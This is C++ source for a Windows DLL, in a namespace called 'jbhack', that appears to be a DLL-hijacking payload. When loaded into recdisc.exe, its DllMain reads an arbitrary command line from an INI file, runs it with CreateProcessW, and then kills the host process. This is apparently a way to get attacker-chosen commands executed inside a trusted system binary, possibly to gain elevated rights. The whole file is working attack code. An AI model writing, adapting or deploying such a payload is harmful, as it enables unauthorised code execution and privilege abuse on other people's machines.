#include <windows.h>
#include <wchar.h>

#include "declarations.hpp"

namespace jbhack {

struct event_log_reporter final
{
    explicit event_log_reporter(bool const enable) noexcept :
        handle_(enable ? RegisterEventSourceW(nullptr, app_name) : nullptr)
    {
    }

    ~event_log_reporter() noexcept
    {
        if (handle_)
            DeregisterEventSource(handle_);
    }

    void report(WORD const type, DWORD const eventId) const noexcept
    {
        if (handle_)
            ReportEventW(handle_, type, 0, eventId, nullptr, 0, 0, nullptr, nullptr);
    }

    void report(WORD const type, DWORD const eventId, WCHAR const * const text) const noexcept
    {
        if (handle_)
        {
            LPCWSTR strings[] = {text};
            ReportEventW(handle_, type, 0, eventId, nullptr, 1, 0, strings, nullptr);
        }
    }

private:
    HANDLE const handle_;
};

template<typename Type, DWORD size>
constexpr DWORD elements_of(Type (&)[size]) noexcept { return size; }

bool do_hack() noexcept
{
    WCHAR ini_file[1024];
    if (!ExpandEnvironmentStringsW(ini_file_pattern, ini_file, elements_of(ini_file)))
        return false;

    event_log_reporter const reporter(GetPrivateProfileIntW(app_name, key_enable_event_logs, 0, ini_file) != 0);

    {
        WCHAR executable[1024];
        if (GetModuleFileNameW(nullptr, executable, elements_of(executable)) == elements_of(executable))
        {
            reporter.report(EVENTLOG_ERROR_TYPE, 101, executable);
            return false;
        }
        LPCWSTR ptr = wcsrchr(executable, L'\\');
        if (!ptr || _wcsicmp(++ptr, L"recdisc.exe"))
        {
            reporter.report(EVENTLOG_ERROR_TYPE, 102, executable);
            return false;
        }
        reporter.report(EVENTLOG_INFORMATION_TYPE, 100, executable);
    }

    {
        WCHAR command_line[4096];
        GetPrivateProfileStringW(app_name, key_command_line, nullptr, command_line, elements_of(command_line), ini_file);
        if (!*command_line)
        {
            reporter.report(EVENTLOG_ERROR_TYPE, 201);
            return false;
        }
        STARTUPINFOW si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        if (!CreateProcessW(nullptr, command_line, nullptr, nullptr, false, CREATE_DEFAULT_ERROR_MODE, nullptr, nullptr, &si, &pi))
        {
            reporter.report(EVENTLOG_ERROR_TYPE, 202, command_line);
            return false;
        }
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        reporter.report(EVENTLOG_INFORMATION_TYPE, 200, command_line);
    }

    return true;
}

}

BOOL WINAPI DllMain(HINSTANCE, DWORD const reason, LPVOID)
{
    if (reason != DLL_PROCESS_ATTACH)
        return true;
    if (!jbhack::do_hack())
        return false;
    ExitProcess(0);
}
